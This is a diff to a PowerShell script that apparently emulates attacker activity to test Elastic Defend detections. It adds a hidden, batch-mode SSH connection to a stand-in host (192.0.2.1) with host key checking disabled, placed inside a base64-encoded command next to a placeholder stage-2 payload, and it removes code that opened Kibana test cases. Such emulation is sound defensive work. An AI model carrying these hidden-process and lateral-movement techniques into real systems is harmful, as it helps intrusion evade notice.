@@ -40,12 +40,6 @@ function Write-Status {
     Write-Host "[$Status] $Action - $Detail" -ForegroundColor $color
 }
 
-# ==============================================================================
-# CONFIGURATION
-# ==============================================================================
-$kibanaUrl       = "<add your Kibana URL here>"
-$elasticApiKey   = "<add your Elastic API Key here>"
-
 # ------------------------------------------------------------------------------
 # 1. PROCESS CLEANUP ON WINDOWS HOST
 # ------------------------------------------------------------------------------
@@ -146,6 +140,28 @@ fs.writeFileSync(process.argv[3], publicKey);
     Write-Status -Action "SSH Key Generation" -Status "SUCCESS" -Detail "RSA key pair present in $sshDir"
 }
 
+$sshExePath = @(
+    "$env:SystemRoot\System32\OpenSSH\ssh.exe",
+    "$env:ProgramFiles\OpenSSH\ssh.exe",
+    "$env:ProgramFiles\Git\usr\bin\ssh.exe"
+) | Where-Object { Test-Path $_ } | Select-Object -First 1
+
+if (-not $sshExePath) {
+    $found = Get-Command ssh -ErrorAction SilentlyContinue
+    if ($found) { $sshExePath = $found.Source }
+}
+
+if (-not $sshExePath) {
+    $sshExePath = Get-ChildItem "$env:SystemRoot\WinSxS" -Filter "ssh.exe" -Recurse -ErrorAction SilentlyContinue |
+                  Sort-Object LastWriteTime -Descending | Select-Object -First 1 -ExpandProperty FullName
+}
+
+if ($sshExePath) {
+    Write-Status -Action "SSH Client Resolution" -Status "SUCCESS" -Detail "Found ssh.exe: $sshExePath"
+} else {
+    Write-Status -Action "SSH Client Resolution" -Status "SKIPPED" -Detail "ssh.exe not found - SSH attempt will be skipped"
+}
+
 if (-not (Test-Path $knownHosts)) {
     try {
         New-Item -ItemType File -Path $knownHosts -Force | Out-Null
@@ -182,9 +198,21 @@ $script = {
         New-Item -ItemType Directory -Path "C:\TEMP" | Out-Null
     }
     Set-Content -Path "C:\TEMP\stage2.ps1" -Value "# Stage 2 Payload" -Force
+
+    $sshExe = '##SSHEXE##'
+    if ($sshExe -and (Test-Path $sshExe)) {
+        $sshProc = Start-Process -FilePath $sshExe -ArgumentList @(
+            "-o", "StrictHostKeyChecking=no",
+            "-o", "ConnectTimeout=3",
+            "-o", "BatchMode=yes",
+            "js_eng_admin@192.0.2.1"
+        ) -WindowStyle Hidden -PassThru
+        Start-Sleep -Seconds 4
+        if ($null -ne $sshProc -and -not $sshProc.HasExited) { $sshProc.Kill() }
+    }
 }
 
-$scriptText = $script.ToString()
+$scriptText = $script.ToString().Replace('##SSHEXE##', $(if ($sshExePath) { $sshExePath } else { '' }))
 $bytes = [System.Text.Encoding]::Unicode.GetBytes($scriptText)
 $encodedCommand = [Convert]::ToBase64String($bytes)
 
@@ -255,55 +283,7 @@ try {
 }
 
 # ------------------------------------------------------------------------------
-# 8. CASE CREATION IN KIBANA
-# ------------------------------------------------------------------------------
-$authHeader = @{
-    "Authorization" = "ApiKey $elasticApiKey"
-    "kbn-xsrf"      = "true"
-    "Content-Type"  = "application/json"
-}
-
-$casePayload = @{
-    owner       = "securitySolution"
-    title       = "[PD3] Need you to investigate --> Signed Binary Masquerade Detected."
-    description = "Just saw this come in - Elastic Defend generated an alert for binary masquerading on $currentHost. Masked binary: $maskedExe. Need you to take a look asap."
-    tags        = @("Tier1-Escalation", "ElasticDefend")
-    connector   = @{
-        id     = "none"
-        name   = "none"
-        type   = ".none"
-        fields = $null
-    }
-    settings    = @{
-        syncAlerts = $true
-    }
-} | ConvertTo-Json -Depth 4
-
-try {
-    $endpoint = "$($kibanaUrl.TrimEnd('/'))/api/cases"
-    $response = Invoke-RestMethod -Uri $endpoint -Method Post -Headers $authHeader -Body $casePayload -ErrorAction Stop
-    Write-Status -Action "Elastic API Case" -Status "SUCCESS" -Detail "Created case ID: $($response.id)"
-} catch {
-    Write-Status -Action "Elastic API Case" -Status "FAILED" -Detail $_.Exception.Message
-}
-
-$caseId = $response.id
-$commentPayload = @{
-    type    = "user"
-    comment = "Finished the triage. Looks real, needs to be reviewed. Urgent."
-    owner   = "securitySolution"
-} | ConvertTo-Json
-
-try {
-    $commentEndpoint = "$($kibanaUrl.TrimEnd('/'))/api/cases/$caseId/comments"
-    Invoke-RestMethod -Uri $commentEndpoint -Method Post -Headers $authHeader -Body $commentPayload -ErrorAction Stop | Out-Null
-    Write-Status -Action "Elastic API Note" -Status "SUCCESS" -Detail "Added note to case ID: $caseId"
-} catch {
-    Write-Status -Action "Elastic API Note" -Status "FAILED" -Detail $_.Exception.Message
-}
-
-# ------------------------------------------------------------------------------
-# 9. FINALIZATION
+# 8. FINALIZATION
 # ------------------------------------------------------------------------------
 Write-Host "Press any key to continue..." -NoNewline
 [void][System.Console]::ReadKey($true)
